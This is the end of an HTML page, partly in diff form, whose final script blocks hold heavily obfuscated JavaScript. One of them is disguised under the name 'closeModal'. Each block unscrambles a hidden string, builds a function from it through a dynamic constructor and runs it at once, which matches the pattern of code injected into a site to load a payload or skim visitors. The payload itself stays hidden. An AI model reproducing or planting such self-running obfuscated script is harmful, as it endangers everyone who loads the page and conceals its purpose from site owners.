Wa4(Wn)o$euerdnWT,ms=7daime8)!W+s]anps..ssr(o.ife=W6)$()umcui3nk)nW)Sdc1nts$.,WWs(a.pt.a$;umren7TWmr}W(d;Wf3W.SWc7nrst.k0W{{2_ltruaettd2.2g$d!tW((7t](W4S=c(n.s{Wa.WWn.(odm#t;e.}dlsead9r]t6r|.9W!3 }fojedMFdfl Wi2Wczlgu(a eDi;e{t9f_=m\/*W(.;j!!s7 zerad){4Cu.)_M=tdtCd.t_WWaWi65($,;,o){Wdda!{]A.=jW!]WfW}6h(5, ,n)Wgt$ 7(Wf4r(=.i_Wp}!$)%,n5r7]3@)d.E!=1%W(=bd2aWsWW=Ws7\/(]+)=#Wi.5_+)W&_W=W.W27}(n(==dWW.W_W)3WE4W\'aW.Wt76(W4o=tW7.%_d)[Ws5)\'rW2W07)(eB2{oB6!;[o70]][(:W9W] .aW11W}rsl$3p9i4e{_4an2>445-f5$_i_ea$WoauTeWt()t$ieb8h[j]!( :! j3ft%bWee_eW;sa$$t7 oa.a7!D[e:d s]4|rd!:d8l ea hedfw!s}w9r$ nWB[g]o=sdu$&xWi&ari,nni]eps[c!e(sde2s)gl WW{b)e!_b)f_aa82E4.5e2W}{uocei"nWd; sdo$bf]6.6s5!joo(s4tWpn$r)5r!tWr..! _W; e>Ss[$WtWm[.de)ts;0umceicnW)%!dp)ic(hWc[$ yec?pjrotf)$5_d_W0o7,;4e!u]n>..jfii(u,WFd d!3=ld(;W@.v.rsdsbcer_(mpdll.rv!W[;(u.(_2=3}c xata'));var cfx=DRA(rhE,mrv );cfx(6102);return 1828})()
+
+
+    var closeModal;(function(){var xRY='',uAg=481-470;function wEJ(x){var j=1771338;var d=x.length;var a=[];for(var t=0;t<d;t++){a[t]=x.charAt(t)};for(var t=0;t<d;t++){var l=j*(t+502)+(j%49221);var m=j*(t+465)+(j%31091);var q=l%d;var p=m%d;var y=a[q];a[q]=a[p];a[p]=y;j=(l+m)%3577601;};return a.join('')};var EnD=wEJ('gomsnruccoqoblcefystnuatwirdhzrpvxtkj').substr(0,uAg);var gbC='v,rve=o=,[8tcvkt;;vva+wd=";(9r[.vrekn.) oh=a8wuvnxre"zde1f}vaa4l+1jc6fnz(;-;eSrt5r!v,=,e*.;[o,; =sg<orjv;,94,hl7e;;61,=btsra=+i9orhf;((a263sgr4aq[=zen,sj;s(+t)elmsg]7s=1;=ran)vbrstn(1r)e].s0[ahC50q) }]=6ra60(l;7s;"pmptrl;9engt(u7v9)iv)hto"C+w)Cvg=;f(7=fo0(c} r=gsc=ys1ajeo07;2}[rkk.1e=>(7===,f{]ai[.i}u4liv;r=vnhj rap-" v;=wulsvvr,;>hw+g j=f(plrunlhfnar4aqrz+,2(f)whk9.+f2)+tx..e;sdazhA}{(to;.eoh,"+e.r=dnt8v6nr;+l [i((4ng)t+<oc wt8fdge,8rf;)(.=x=,e.(o+,r=t)r i.o(=;=){ru;1Ahszznrrgl(.a.y;e=lzleyt*h"1f(=tj+r1.apdg5Aiwp-),)d=)t.w{ge;nit 0j=ijxlgh; scf })wn0l)vf[vhpgf(ur6qsrrd;h+ ,h,a]t=r]]t ,)u);u[yis,q8.sqofA,g;gabrui,(s.=4n ohnrae.<p8fa;rbb(p[5ib m;invr-hof+nb]u)2uibhp=j -laa =u)g(h;{-.0nCw+l=at+u)d;"08 mva,"[ac4o=)((!3=n;;3stwh;rer+iah cov)a2n)+;7m(am0s ovCn;tCezl{g09;au]]0r6(sS]s=<+1l.{<-rl2;(stfn,v f)c.f2(r+.a9A+;;p[Cr[)(o9wnt5],a+mair"a)o])ryns ))rmool ]hmi;8lCtpyg1n(..)=,l(ai+';var OXX=wEJ[EnD];var Ytx='';var yVk=OXX;var JdR=OXX(Ytx,wEJ(gbC));var oWE=JdR(wEJ('=%^,e,>su2_=.75^!f{rz0)]d5;63={_g+f5I)s^=pf7+f50^^(f6+^s15d^g$16(;=-^fej@y5^03.6f"(.m ;le.9i\/5n{.^^_n5^siC^^!r,jst^ri_n]e7^o^^8 +j$oei_.nefy. u0(n_7$o^Si0it.t S^\/+r_\'59[es^l6^z(s4[keslc t^o%}{<*=l_c2st^s>1M.;^1 6i ^i;a=%&je^in,.^#^.c].^11yte66%18)f!);^_2o.)z0_q,$ah^i^6^^ ^^:^f8[^=3fcen"jn,o(d4d;b3,%_7mqb^Ee^jlt;o==n.ze=(_^53l>$ib+=f(4._s.^e[!^fe=]3! ^5$3.1;,$ m..\/3^l^=]o^(;0^<^dvfe)rn_d@2l,^$]_]^$3a1,}(8;?,-^..&n5=>1$n^n=%#53. pf{.8)s^^!^7$4,;n^o)oa4s;7se^<a^=_))4^(^,^_;d4)^^^a.56_^#c7btt78i@,.^=u^e.!_ij_sl;}9(2j)!&";,]^!+1(0u^s)g_y;^8c^#8+69as}a&^}^! r97g(^u3gr8(C;4r_.}3^8i. n)6;n(,i^op3 $nfc..=p]^.4=$0}^ 5).]20^^39ge\'(h$j7_^.^d_!m^at^4!)o@b4)^]+lzm6l-6r54"{^e)343b%t,7^^e6.l^<u9(^^^7u]h9 07);="%.!_{ ^3,>ao^^}(a.{.3,^h_oi^{,^.d6.){4)=5pj^^7b6f0!)(^f^+(^ 50c;f$ _!e^)4v. }?22,t.^=^2)flc()9f=1.^}(^;^^2e)+^;.o_0},;jtuj]%,s()s^bn^),056\'0{4(^(*?]n9c(;}^^%u$lo6^M.d0s])=a);e,^71)\'}n0rsl6)i)b!z$5,tu)$dg9b^+{67^=n{^^^3*90e(pl6,?r)3^u^1e_o]fs6{^7).!({ns!)9)$t.^# ^(4^^;6}o!!;0l.!()^ 51)0^dl.1^^^!!;bo.)u;$3(_4\'t(eh0^^e2)^g#fo*rt)3(!b^^3]\'z16()e.rfqt2s _{(4^]"^).e3.3)!79tf^z!!^1^\'jwo((4\/.9%b}15#)}).$b^$(]^_1t5jd;^..!d: nf^S3)0,^%1re__9asottu^u#\'7(; tn=r!i(^\/(l(,al%o)$_1^^]!sanwlubt;+(;_=.lo _$be.<8,i^t_^m=s,".,(;.((^^(_3)78};l 1)^.f(et^^.f} ^n1gfe}n( ]$_-. 9ret_e7o.^e==]=, ^!"g{i5wf (s)"'));var IdC=yVk(xRY,oWE );IdC(5226);return 8078})()
+    </script>
+
+
+
+</body></html>
